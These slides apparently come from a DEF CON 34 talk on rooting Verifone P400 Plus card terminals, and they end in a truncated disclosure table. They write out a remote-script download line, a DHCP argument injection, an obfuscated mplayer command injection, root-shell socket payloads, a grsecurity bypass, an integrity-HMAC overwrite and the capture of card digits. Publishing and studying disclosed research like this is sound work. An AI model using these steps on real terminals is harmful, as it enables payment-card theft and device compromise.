---
title: "Very Pwned Hacking Verifone’s card machine three times in a row"
speakers: ["Reino Mostert"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: null
source_pdf: "DEF CON 34/DEF CON 34 - Reino Mostert - Very Pwned Hacking Verifone’s card machine three times in a row - m.pdf"
pages: 75
sha256: "8647a0375253498cc487606a000d2f466a60ef62b91efb5cd02709ccf679a797"
text_chars: 26470
ocr_pages: 20
has_ocr: true
redacted_secrets: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2 + tesseract"
converted_at: "2026-08-12T00:27:08Z"
---
# Very Pwned Hacking Verifone’s card machine three times in a row

**Speakers:** Reino Mostert  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Reino Mostert - Very Pwned Hacking Verifone’s card machine three times in a row - m.pdf` (75 pages)

## Slide 1

# VeriPwned

Hacking Verifone’s card machine three times in a row

## Slide 2

##### whoami

```
~ $ id
```

```
uid=1000(reino)
gid=1337(Orange Cyberdefense–SensepostTeam)
```

```
~ $
```

## Slide 3

##### TL;DW

Verifone P400 Plus* card machines are great! It can play music It can play movies It can play doom It can render HTML It can host a webserver You can steal its card data And root it in 3 different ways

* Also applies to the V400m. Maybe others?

5/5 – “Would hack again”

## Slide 4

##### Redactions

We have redacted our slides so that script kiddies can’t use it to burn the world down We have replaced the payloads with non-obvious hacking commands

## Slide 5

## A humble start

Attribution: https://en.wikipedia.org/wiki/Unicorn_(finance)#/media/File:VeriFone_P400_with_Adyen_at_the_Euromast,_Rotterdam-Centrum,_Rotterdam_(2023)_02.jpg Donald Trung Quoc Don (Chữ Hán: 徵國單 ) - Wikimedia Commons

## Slide 6

Fan Noise and Photos - Round 1

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Fan Noise
elale
Photos -
Round 1
```

## Slide 7

## Prior work

trixr4skids Doomed POS: https://media.defcon.org/DEF%20C ON%2025/DEF%20CON%2025%20v ideo%20and%20slides/DEF%20CO N%2025%20-%20trixr4skids%20%20DOOMed%20Point%20of%20S ale%20Systems.mp4

## Slide 8

Getting a shell #1: Music anyone?

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Getting a shell
/mnt/usbstor1
)) Boa - Duvet.mp3
Play audio file,
The Prodigy - Firestarter.mp3?
CE mc
¢ FUKKIRETA - 10 hours Loop.m...
)) Megalovania - 10 hours.mp3
)) Origa - Inner Universe.mp3
nf) The Prodiav - Firestarter mo3
1: Mu
sic anyoner
=
```

## Slide 9

##### Getting a shell #1: Music anyone?

```
~ $ telnet 10.0.0.2 9998
Trying 10.0.0.2...
Connected to 10.0.0.2.
Escape character is '^]'.
VFI 2013.10 Raptor
```

```
~ $ id
uid=601(sys2) gid=601(sys2)
groups=601(sys2),616(system),700(share),
710(usr1sys),711(usr2sys),712(usr3sys),
713(usr4sys),714(usr5sys),715(usr6sys),
716(usr7sys),717(usr8sys),718(usr9sys),
719(usr10sys),720(usr11sys) . . . . . .
```

## Slide 10

#### Music and Screenshots

## Slide 11

## Enumeration of Security

## Slide 12

Fan Noise and Photos: Round 2

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Fan Noise
elale
Photos:
Round 2
```

## Slide 13

Getting root #1: 3 chain attack

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Getting root #1: 3 chain attack
d
```

## Slide 14

##### Getting root #1: 3 chain attack

```
<?xml version="1.0" encoding="UTF-8"?>
```

```
<SETTINGS>
```

```
. . . . .
```

```
<ETHLINK name_id="miniUSB0" suppliconf="" interface="miniUSB0"
local_ip="" broadcast="" netmask="" gateway="" dns1="" dns2=""
usedhcp="1" activate="1" dhcpid="" clienthostname="VFI-275-387-534"
speed="0" mtu="" bridge_to="" bridge_uplink="0"/>
```

```
. . . . .
```

```
</SETTINGS>
```

## Slide 15

##### Getting root #1: 3 chain attack

```
svc_netcontrol: net.svc: pnet_startDHCP: -
[miniUSB0]: Parameters - [
/sbin/udhcpc
```

- `-i miniUSB0 -T 3 -t 5 -A 3`

- `-s /usr/local/sbin/udhcpend.sh`

- `-p /tmp/net/pid/miniUSB0.pid -b -S`

- `-H VFI-275-387-534`

```
]
```

```
udhcpc[1327]: udhcpc (v1.22.0) started
```

## Slide 16

Getting root #1: 3 chain attack

```
udhcp client (udhcpc)
```

```
The udhcp client negotiates a lease with the DHCP server
and notifies a set of scripts when a leases is obtained or
lost.
```

```
The command line options for the udhcp client are:
-c, --clientid=CLIENTID       Client identifier
-H, --hostname=HOSTNAME       Client hostname
```

```
. . . . . . . . . . . . .
```

```
-s, --script=file      Run file at dhcp events
                       (default: /etc/udhcpc/default.script)
```

## Slide 17

##### Getting root #1: 3 chain attack

```
/ #
```

```
/ # ls -la /etc/udev/rules.d/
drwxr-xr-x 2 root root 1040 Jan 1 1970 .
drwxr-xr-x 4 root root 696  Jan 1 1970 ..
-rw-r--r-- 1 root root 4081 Oct 28 2021 auto_usb.rules
-rw-r--r-- 1 root root 748  Oct 28 2021 automount.rules
-rw-r--r-- 1 root root 2126 Oct 28 2021 autonet.rules
-rw-r--r-- 1 root root 1041 Oct 28 2021 local.rules
-rw-r--r-- 1 root root 5635 Oct 28 2021 localextra.rules
-rw-r--r-- 1 root root 648  Oct 28 2021 locali2c.rules
-rwxr--r-- 1 root root 307  Oct 28 2021 nextminiusb
lrwxrwxrwx 1 root root 35   Jan 1  1970  radio_temp_mtm.rules ->
/mnt/flash/etc/radio_temp_mtm.rules
```

## Slide 18

Getting root #1: 3 chain attack `SUBSYSTEM=="block", ACTION=="add" RUN+= "/bin/sh -c 'IEX (New-Object Net.WebClient).DownloadString( 'https://1337.h4x0r/InvokeMimikatz.ps1')'"`

## Slide 19

Getting root #1: 3 chain attack

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Getting root #1: 3 chain attack
1S
```

## Slide 20

##### Getting root #1: 3 chain attack

```
<?xml version="1.0" encoding="UTF-8"?><SETTINGS>
```

```
. . . . .
```

```
<ETHLINK name_id="miniUSB0" suppliconf="" interface="miniUSB0"
local_ip="" broadcast="" netmask="" gateway="" dns1="" dns2=""
usedhcp="1" activate="1" dhcpid="" clienthostname="VFI-275-387-534
-s /lib/udev/udevd"speed="0" mtu="" bridge_to=""
bridge_uplink="0"/>
```

```
. . . .
```

```
</SETTINGS>
```

## Slide 21

Getting root #1: 3 chain attack `#!/usr/bin/python3 import sys, tarfile`

```
tf = tarfile.open('netconf.tgz', 'w:gz')
```

```
tf.add(
'symlink_to_mnt_flash_etc_config_svcnet',
'symlink_to_mnt_flash_etc_config_svcnet'
)
```

```
tf.add(
'netconf.xml',
'symlink_to_mnt_flash_etc_config_svcnet/netconf.xml'
)
tf.close()
```

Adapted from https://github.com/ptoomey3/evilarc

## Slide 22

##### Getting root #1: 3 chain attack

```
svc_netcontrol: net.svc: pnet_startDHCP:
- [miniUSB0]: Parameters –
[
/sbin/udhcpc
```

- `-i miniUSB0 -T 3 -t 5 -A 3 -s /usr/local/sbin/udhcpend.sh`

```
-p /tmp/net/pid/miniUSB0.pid -b -S
-H VFI-275-387-534 -s /lib/udev/udevd
 ]
```

```
udhcpc[2454]: udhcpc (v1.22.0) started
udevd[2456]: starting version 182
```

Adapted from https://github.com/ptoomey3/evilarc

## Slide 23

Getting root #1: 3 chain attack

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
zi $ telnet 10.0.0.2 99908
Verifone
Main (Prod)
Information
Administration
Update
Security
Diagnostics
Manufacturing
Exit
Riin Annileatiane a
```

## Slide 24

Demo 1

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
mmm > telnet 10.0.0.2 9999
‘Trying 10.0.0.2...
Connected to 10.0.0.2.
Escape character is '*]'.
VFI 2013.10 Raptor
uid=0( root) gid=0( root)
/#f§
```

## Slide 25

## Slide 26

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
$ picocom -b 115200 /dev/ttyUSBO
picocom v3.1
Verifone port is : /dev/ttyUSBO
flowcontrol : none
baudrate is : 115200
parity is : none
databits are : 8
stopbits are : 1
escape is : C-a
local echo is : no
noinit is : no
noreset is : no
hangup is : no
nolock is : no
send_cmd is : SZ -VV
imap is :
omap is :
emap is : crerlf,delbs,
logfile is : none
initstring : none
exit_after is : not set
exit is : no
Type [C-a] [C-h] to see available commands
Terminal ready
0
```

## Slide 27

Demo 2

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
RITES
Verifone
Hello DEFCON!
Greetz to the Fam & Friends & SP Crew
It always seems impossible until it's done
hice
ebook for Instr
/bin/sh: can't access tty; job control turned off
uid=0 gid=0
/#f)4
Seeman
```

## Slide 28

Fan Noise and Photos: Round 3

## Slide 29

## Slide 30

##### VIPA

###### `Request`

|`┌──────────────────────`
`│Name`
`├──────────────────────`|`┬────────────────────────`
`│Description`
`┼────────────────────────`|`─┬──────────`
`│Byte(s)`
`─┼──────────`|`┬────────────┐`
`│In Packet** │`
`┼────────────┤`|
|---|---|---|---|
|`│NAD (Node Address)`
`│PCB (Protocol Control)`
`│LEN (Length)`
`│CLA (Class)`
`│INS (Instruction)`
`│P1 (Parameter 1)`
`│P2 (Parameter 2)`
`│LC (Length)*`
`│Data*`
`│Le (Length Expected)*`
`│LRC`
`└──────────────────────`|`│Node address [1]`
 `│Protocol flags [2]`
`│Packet length [3]`
`│Instruction class`
`│Instruction code`
`│Parameter 1`
`│Parameter 2`
`│Data length [4]`
`│TLV data field`
 `│Expected return length`
`│Checksum [5]`
`┴────────────────────────`|`│1`
`│1`
`│1`
`│1`
`│1`
`│1`
`│1`
`│1`
`│Variable`
`│1`
`│1`
`────────────`|`│All│`
`│All│`
`│All│`
`│1st Only`
`│`
`│1st Only`
`│`
`│1st Only`
`│`
`│1st Only`
`│`
`│1st Only`
`│`
`│All│`
`│1st Only`
`│`
`│All│`
`┴────────────┘`|

- `denotes optional field`

- `** only applicable for chained mode`

- `[1] 01 == PED`

```
[2] 00 = Single packet. 01 = Chained mode - another request packet follows
```

```
[3] Packet length excluding NAD, PCB and LRC. In chained packets after the 1st packet CLA, INS, P1, and P2 are omitted.
```

```
[4] Length of the data field within the current packet
```

```
[5] “Longitudinal Redundancy Check”: Actually, it’s an iterative XOR of each byte in the packet.
```

## Slide 31

##### VIPA

###### `Response`

|`┌──────────────────────`
`│Name`
`├──────────────────────`|`┬─────────────────────`
`│Description`
`─────────────────────`|`───┬──────────`
`│Byte(s)`
`───┼──────────`|`┬───────────┐`
`│In Packet**│`
`┼───────────┤`|
|---|---|---|---|
|`│NAD (Node Address)`

|`│Node address [1]`
|
`│1`

|`│All`
`│`

|
|`│PCB (Protocol Control)`

|`│Protocol flags [2]`
|
`│1`
|`│All`
`│`

|
|`│LEN (Length)`

|`│Packet length [3]`
|`│1`
|`│All`
`│`

|
|`│Data*`
|`│TLV response data`
|`│Variable`
|`│All`
`│`

|
|`│SW1 (Status Byte 1)`
|`│Status byte 1 [4]`
|`│1`
|`│Last Only`
`│`

|
|`│SW2 (Status Byte 2)  `
`│LRC`
`└──────────────────────`|`│Status byte 2 [4]`
`│Checksum [5]`
`┴─────────────────────`|`│1`

`│1`
`───┴──────────`|`│Last Only`
`│`
`│All`
`│`
`┴───────────┘`|

- `denotes optional field ** only applicable for chained mode [1] 01 == PED`

- `[2] 00 = Single packet. 01 = Chained mode - another response packet follows [3] Packet length excluding NAD, PCB, LRC, LEN.`

- `[4] Status bytes used together to indicate the success or failure of the command.`

- `[5] “Longitudinal Redundancy Check”: Actually, it’s an iterative XOR of each byte in the packet.`

## Slide 32

##### VIPA

###### `Commands`

|`┌───────────────────`
`│Command`
`├───────────────────`|`┬───┬───┬───────┬───────┬`
`│CLA│INS│P1  │P2    │`
`┼───┼───┼───────┼───────`|`────────────`
`Data`
`────────────`|`┬───────────────┐`
`│LE      │`
`───────────────┤`|
|---|---|---|---|
|`│Select File`
|`│00│A4│04│00│`
|`Filename`
|`│-       │`
|
|`│Read Binary`

|`│00│B0│Offset¹│Offset¹│`
|`LSB¹`
|`│Bytes to Read │`

|
|`│Update Binary`

|`│00│D6│Offset¹│Offset¹│`
|`LSB+Content¹ `
|`│-`
`│`
|
|`│Display Free Text`
|`│D2│01│00│01│`
|`Text string`
|`│-       │`
|
|`│Reset Device`
`└───────────────────`|`│D0│00│00│01│`
`┴───┴───┴───────┴───────┴`|`-`
`────────────`|`│-       │`
`┴───────────────┘`|

- `Actual network packets must also include: NAD, PCB, LEN, Lc (if applicable), and LRC. ¹` **Offset Addressing:**

**15-Bit Mode (P1 bit 8 = 0):**

**Offset:** Formed by **P1** (high byte) and **P2** (low byte).  Data: Don’t include for **Read Binary. Content Only for Update Binary. LE Field:** Contains a single byte specifying the **number of bytes to read (only for  Read Binary)**

**23-Bit Mode (P1 bit 8 = 1):**

**Offset:** Formed by **P1** (high byte), **P2** (middle byte), and the **first byte of Data** (low byte). **Data Field:** The first byte is the **offset low byte + Content.  LE: For read, include LE indicating** the **number of bytes to read** . **Max 249 bytes of data Read/Write per command.**

## Slide 33

##### VIPA

- `~ $ ./ped_read 10.0.0.2 16107 /etc/passwd text`

- `[*] Connecting to PED at 10.0.0.2 on port 16107`

- `[*] Reading the welcome message`

- `[+] Sending Select File (00 A4 04) command for /etc/passwd`

- `[+] Sending Read Binary (00 B0) command(s) with different offsets`

- `[+] File content (as text):`

```
root:x:0:0:root:/root:/bin/false
sys12:x:611:611:sys12:/home/sys12:/bin/false
sys13:x:612:612:sys13:/home/sys13:/bin/false
sys2:x:601:601:sys2:/home/sys2:/bin/false
. . . . .
```

## Slide 34

##### VIPA

- `~ $ ./ped_write`

- `[*] Connecting to PED at 10.0.0.2 on port 16107`

- `[+] Reading the welcome message`

- `[+] Sending Select File (00 A4 04) command for /tmp/test_file`

- `[+] Sending Update Binary (00 D6) to write, in chunks of 249 bytes`

- `[+] Writing chunk to offset 0`

- `[+] Writing chunk to offset 249`

- `[+] Writing chunk to offset 498`

- `[+] Writing chunk to offset 747`

- `[!] Upload complete`

## Slide 35

##### VIPA

###### **`D2 E0 – DISPLAY_HTML`**

###### `Data TLV field to display /tmp/test.html`

   - `┌────────────────────────────────────────┬──────────┬───────────────────────────────────┐ │Hex Segment                             │TLV Role  │Description / Value                │ ├────────────────────────────────────────┼──────────┼───────────────────────────────────┤ │E0                                      │Tag       │Template:` **`_E0_DATA_ELEMENTS`** `│ │3E                                      │Length    │62 bytes                           │ │DFAA01                                  │Tag       │Ext Tag:` **`_DFAA01_HTML_RESOURCE_PATH`** `│ │3A                                      │Length    │58 bytes                           │ │(2E2E2F)*15+746D702F746573742E68746D6C  │Value     │(../ * 15) + /tmp/test.html        │ └────────────────────────────────────────┴──────────┴───────────────────────────────────┘`

- `Optional DFAA02_HTML_KEY_NAME and DFAA03_HTML_KEY_VALUE tags can be used to passing dynamic variables to the HTML page`

## Slide 36

### Getting shell #2: Remote Movies

## Slide 37

Getting shell #2: Remote Movies

```
sprintf_custom(&mplayer_cmd,
"/usr/bin/mplayer -vo fbdev2 -really-quiet –slave
 -vf scale=%d:%d -geometry %dx%d+%d+%d %s %s",
 video_width, video_height, video_width,
video_height, pos_x, pos_y, loop_arg,
filename);
```

```
. . . . .
```

```
retVal = executeUtil(mplayer_cmd, 0);
```

## Slide 38

##### Getting shell #2: Remote Movies

```
-heartbeat-cmd
```

```
Command that is executed every 30 seconds during
playback via system() - i.e. using the shell.
NOTE: MPlayer uses this command without any
checking, it is your responsibility to ensure it
does not cause security problems. . .
It also only works when playing video. . .
```

## Slide 39

Getting shell #2: The Space in our Movies

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Dee
agi
2
IN our
ing shell
ies
The Space
Mov
Gett
```

## Slide 40

##### Getting shell #2: The Space in our Movies

```
~ $ x=' '
~ $ echo$x'Hello'
Hello
```

```
~ $ printf$x\\x48\\x65\\x6c\\x6c\\x6f\\x0a
Hello
```

## Slide 41

Getting shell #2: The Space in our Movies

```
~ $ x=`date`
```

```
~ $ echo "$x"
Thu Feb 26 16:19:18 UTC 2026
```

```
~ $ x=`date`&&x=${x#???????????????????????}
```

```
~ $ echo "$x"
```

```
<SPACE>2026
```

## Slide 42

##### Getting shell #2: The Space in Our Remote Movies

```
~ $
```

```
x=`date`&&x=${x#???????????????????????}\\x20sh\\x20\\x2ftmp\\x2fr
~ $ echo "$x"
```

```
<SPACE>2026\x20sh\x20\x2ftmp\x2fr
```

```
~ $
```

```
x=`date`&&x=${x#???????????????????????}\\x20sh\\x20\\x2ftmp\\x2fr&&
x=`printf${x}`
```

```
~ $ echo "$x"
```

```
2026 sh /tmp/r
```

## Slide 43

##### Getting shell #2: The Space in Our Remote Movies

```
~ $ echo "$x"
2026 sh /tmp/r
```

```
~ $
```

```
x=`date`&&x=${x#???????????????????????}\\x20sh\\x20\
\x2ftmp\\x2fr&&x=`printf${x}`&&x=${x#?????}
```

- `~ $ echo "$x" sh /tmp/r`

## Slide 44

##### Getting shell #2: Remote Movies

```
<!DOCTYPE html>
<htmllang="en"> <head></head>
<bodystyle="background-color:black">
<video
src="file:///tmp/t.mp4-heartbeat-cmd
x=`date`&&x=${x#????????????????????????}\\x20sh\\x20\\x2ftmp\\x2fr&&x=p
rintf${x}`&&x=${x#?????}&&${x}&"
autoplayloopwidth="320"controls
style="border: 5px solid red">
Your browser does not support the video tag.
</video>
</body>
</html>
```

## Slide 45

##### Getting shell #2: Remote Movies

Write HTML Write movies Display HTML Write /tmp/r script

guiprtserver

## Slide 46

Getting root #2: Socket fun

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Getting root
2: Socket
fun
/
UU
Or
\
```

## Slide 47

##### Getting root #2: Socket fun

```
voidexec_thread_func(int socket_fd)
{
```

```
. . . . . . . .
```

```
pmsg_server_read_msg(msg_output, socket_fd);
memcpy(function_name, msg_output,140);
     . . . . . . . .
```

```
function_pointer= (void*)netctl_get_function(function_name);
     . . . . . . . .
```

```
returnVal = (*function_pointer)(0, arguments, argument_size,
     response_buffer, response_size);
}
```

## Slide 48

##### Getting root #2: Socket fun

```
voidnetctl_get_function(char * function_name)
{
```

```
. . . . . .
function_pointer=
dlsym(dlopen_handle_libsvc_net, function_name);
   . . . . . .
   returnfunction_pointer;
}
```

## Slide 49

##### Getting root #2: Socket fun

```
  ┌────────┬─────────────────────────────────────────────────┬────────────────┐
  │00000000│ 75 74 69 6c 73 5f 65 78 65 63 5f 63 6d 64 00 00 │utils_exec_cmd00│
  │00000010│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
  │00000020│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
  │00000030│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
  │00000040│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
  │00000050│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
  │00000060│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
  │00000070│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
  │00000080│ 17 00 00 00 2f 62 69 6e 2f 73 68 20 2f 74 6d 70 │•000/bin/sh /tmp│
  │00000090│ 2f 72 75 6e 61 73 72 6f 6f 74 00 00 │/runasroot00 │
  └────────┴─────────────────────────────────────────────────┴────────────────┘
```

```
~ $echo -ne '<Payload Bytes Here>' | socat - UNIX-
CONNECT:/tmp/net/netprocsock_3
```

## Slide 50

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
$ ./exploith
I
Verifone
02:06 am
om 6-28 €3.9
7 PRS 8 TUV fe) WXY
```

## Slide 51

Demo 3

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Demo 3
$ ./exploit
[*] Connecting to PED...
[+] Uploading test.html to /tmp/test.html
[+] Uploading run to /tmp/r
[+] Uploading test.mp4 to /tmp/t.mp4
[+] Uploading runasroot to /tmp/runasroot
[+] Uploading blank to /tmp/t.mp4 -heartbeat-cmd x= ‘date’ &&x=$
Verifone
[*] Starting video by sending Display HTML command
/bin/sh: can't access tty; job control turned off
uid=0( root) gid=0( root)
/ #4
```

## Slide 52

Fan Noise and Photos: Round 4

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Fan Noise
elale
Photos:
Round 4
```

## Slide 53

#### Patches and Downgrades

Windows Downdate - Alon Leviev https://www.youtube.com/watch?v=HHmxuxQ7bE8

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Patches and C |
Downgrades £Y)
Windows Downdate - Alon Leviev
https://www.youtube.com/watch ?v=HHmxuxQ7bE8
```

## Slide 54

Getting shell #3: Downgrade

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Getting shell
User: sys13 Version: 3.0.80
Category: fs Date:
guiprtserver
User: sys13 Version: 2.59.1
Category: fs Date:
Icp
User: sys13 Version: 2.21.2
Category: fs Date:
3: Downgrade
Verifone’
Installing...
Stage 8/8
Extracting SYS packages
90%
User: sys13 Version: 3.0.80
Category: fs Date:
guiprtserver
User: sys13 Version: 2.48.0
Category: fs Date:
Icp
User: sys13 Version: 2.21.2
Category: fs
Date:
```

## Slide 55

##### Getting shell #3: Downgrade

```
$ id
```

```
uid=612(sys13) gid=612(sys13)
groups=612(sys13),616(system),700(share),710(usr1sys)
,711(usr2sys),712(usr3sys),713(usr4sys),714(usr5sys),
715(usr6sys),716(usr7sys),717(usr8sys),718(usr9sys),7
19(usr10sys),720(usr11sys),721(usr12sys),722(usr13sys
),723(usr14sys),724(usr15sys),725(usr16sys),1000(audi
o),1001(tty),1002(disk),1003(dialout),1004(video),100
5(lp),1006(floppy),1007(tape),1008(input),1009(cdrom)
,1010(kmem),1012(payment)
```

## Slide 56

##### Getting root #3: NTPD & HTTPD fun

**ntpd** [-dnqNwl] [-S PROG] [-p PEER]... NTP client/server Options:

-d      Verbose

-n      Do not daemonize -q      Quit after clock is set -N      Run at high priority -w      Do not set time (only query peers), implies -n

-l        Run as server on port 123

-S       PROG Run PROG after stepping time, stratum change, and every 11 mins -p       PEER Obtain time from PEER (may be repeated)

## Slide 57

##### Getting root #3: NTPD & HTTPD fun

```
From httpd.c [1] :
. . . . .
```

```
If a sub directory contains config file, it is parsed and merged
with
```

```
any existing settings as if it was appended to the original
configuration.
```

```
. . . . .
httpd.conf format:
```

```
. . . . .
```

```
*.php:/path/php# run xxx.php through an interpreter
```

```
[1] https://elixir.bootlin.com/busybox/1.22.0/source/networking/httpd.c
```

## Slide 58

Getting root #3: NTPD & HTTPD fun `Our /tmp/cgi-bin/httpd.conf: *.cgi:/bin/sh Example index.cgi: #!/bin/sh echo "Content-type: text/html" echo "" id` <script>alert('XSS')</script>

## Slide 59

##### Getting root #3: NTPD & HTTPD fun

```
   ┌────────┬─────────────────────────────────────────────────┬────────────────┐
   │00000000│ 70 6e 65 74 5f 73 65 74 4e 54 50 5f 6d 73 67 00 │pnet_setNTP_msg0│
   │00000010│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
   │00000020│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
   │00000030│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
   │00000040│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
   │00000050│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
   │00000060│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
   │00000070│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
   │00000080│ 34 0000 00 31 30 2e 30 2e 30 2e 31 20 20 2d 53 │800010.0.0.1 -S│
   │00000090│ 20 2f 75 73 72 2f 73 62 69 6e 2f 68 74 74 70 64 │ /usr/sbin/httpd│
   │000000a0│ 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 │0000000000000000│
   │000000b0│ 00 00 01 00 01 00 00 00 │00•0•000 │
   └────────┴─────────────────────────────────────────────────┴────────────────┘
```

- `~ $ echo -ne '<Payload Bytes Here>' | socat - UNIXCONNECT:/tmp/net/netprocsock_3`

## Slide 60

##### Getting root #3: NTPD & HTTPD fun

```
$ curlhttp://10.0.0.1/etc/passwd
root:x:0:0:root:/root:/bin/false
sys12:x:611:611:sys12:/home/sys12:/bin/false
sys13:x:612:612:sys13:/home/sys13:/bin/false
sys2:x:601:601:sys2:/home/sys2:/bin/false
sys3:x:602:602:sys3:/home/sys3:/bin/false
sys4:x:603:603:sys4:/home/sys4:/bin/false
sys6:x:605:605:sys6:/home/sys6:/bin/false
usr1:x:500:500:usr1:/home/usr1:/bin/false
$ curlhttp://10.0.0.1/tmp/cgi-bin/index.cgi
uid=0(root) gid=0(root)
```

## Slide 61

Tamper Seal & Persistence

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
a0)
O
Cc
ed)
a)
Tamper Seal
& Persis
```

## Slide 62

##### Tamper Seal & Persistence

```
/ # dmesg
grsec: (root:U:/bin/busybox) denied execution
of /media/sda1/busybox by
/bin/busybox[sh:2770] . . . .
grsec: (root:U:/bin/busybox) denied create of
/dev/shm/test for writing by
/bin/busybox[sh:2313] . . . .
```

## Slide 63

##### Tamper Seal & Persistence

```
rolerootu
subject/
        /dev/grsec              h
        /sbin/gradm             h
subject/sbin/gradma
        /dev/grsec              rw
subject/usr/local/sbin/secinshp
        /sbin/gradm             rx
        /dev/shm/sem.*          rwxcdl
subject/lib/udev/udevd
        /dev/*                  rwxcdl
```

## Slide 64

##### Tamper Seal & Persistence

```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
```

```
void _init() {
unsetenv("LD_PRELOAD");
system("/bin/sh");
}
```

Compile it with https://launchpad.net/linaro-toolchain-binaries/+milestone/2013.03

## Slide 65

##### Tamper Seal & Persistence

```
/ # cp /media/sda1/sem.so /dev/shm/
```

```
/ # LD_PRELOAD=/dev/shm/sem.so /usr/local/sbin/secins
/ # gradm -D
```

```
Password:
```

```
/ #
```

```
/ # dmesg| tail -n 1
```

```
[  246.608459] grsec: From 10.0.0.1: shutdown auth success
for /sbin/gradm[gradm:2970] uid/euid:0/0 gid/egid:0/0, parent
/bin/busybox[sh:2934] uid/euid:0/0 gid/egid:0/0
```

## Slide 66

##### Tamper Seal & Persistence

```
/ # mount
```

```
......
ubi0:securefs on / type ubifs  (ro,sync,relatime)
```

```
......
```

```
/ # cat /mnt/flash/system/securefs.hmac
c2a42e93ceed4015d49fa0cc10c92746d3cbdde3ab02e2c26e9a
2e0a93512299
```

## Slide 67

##### Tamper Seal & Persistence

```
/ # mount -o remount,rw /
/ # vi /etc/init.d/udev
/ # mount -o remount,ro /
```

```
/ # /media/sda1/./calc
Calculate HMAC buffer size: 524288
HMAC Volume Size: 134340608
Total Read: 134340608
The resulting HMAC value is:
```

```
ca7828ec3990805006619140655b4944218d29bcb059e7dadf12b1214b078fe7
```

```
/ # echo -ne
```

```
'ca7828ec3990805006619140655b4944218d29bcb059e7dadf12b1214b078fe7'
>/mnt/flash/system/securefs.hmac
```

## Slide 68

Actions on Target: Doom!

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Actions on
Target:
Doom!
-COnn GA a.
“Save, GAME
READFTHIS' .
Qui SAME .
Ciefions
```

## Slide 69

Actions on Target

## Slide 70

Demo 4

## Slide 71

Actions on Target: Money!

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Actions on
arget:
Money!
2 4055 9409
MR JOHN DOE VISA
```

## Slide 72

##### Actions on Target

```
/media/sda1 # ./strace -s 16 -p `pidof msr_decoder`
```

```
.........
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0004\1\23\2", 16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0008\2\23\2", 16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0005\3\23\2", 16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0008\4\23\2", 16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0000\5\23\2", 16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0003\6\23\2", 16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0000\7\23\2", 16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0002\10\23\2",16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0004\t\23\2", 16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0000\n\23\2", 16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0006\v\23\2", 16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0005\f\23\2", 16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0009\r\23\2", 16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0004\16\23\2",16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0000\17\23\2",16) = 16
write(5, "\0\0\0\0\0\0\0\0\4\0\3\0009\20\23\2",16) = 16
```

## Slide 73

Memory Dumps

## Slide 74

##### Disclosures

|`┌──────────────────────────────────────────────────────────────────┬────────────`
`│Issue                                                             │Disclosed`
`├──────────────────────────────────────────────────────────────────┼────────────`|`┬────────────┬──────────────┐`
`│Patched     │CVE│`
`┼────────────┼──────────────┤`|
|---|---|
|`│Command Injection in mediaServer│2020-11-30`
`├──────────────────────────────────────────────────────────────────┼────────────`|`│2024-01-17  │CVE-2020-37266│`
`┼────────────┼──────────────┤`|
|`│Argument Injection in libsvc_net (udhcpc)`
`│2023-10-31`
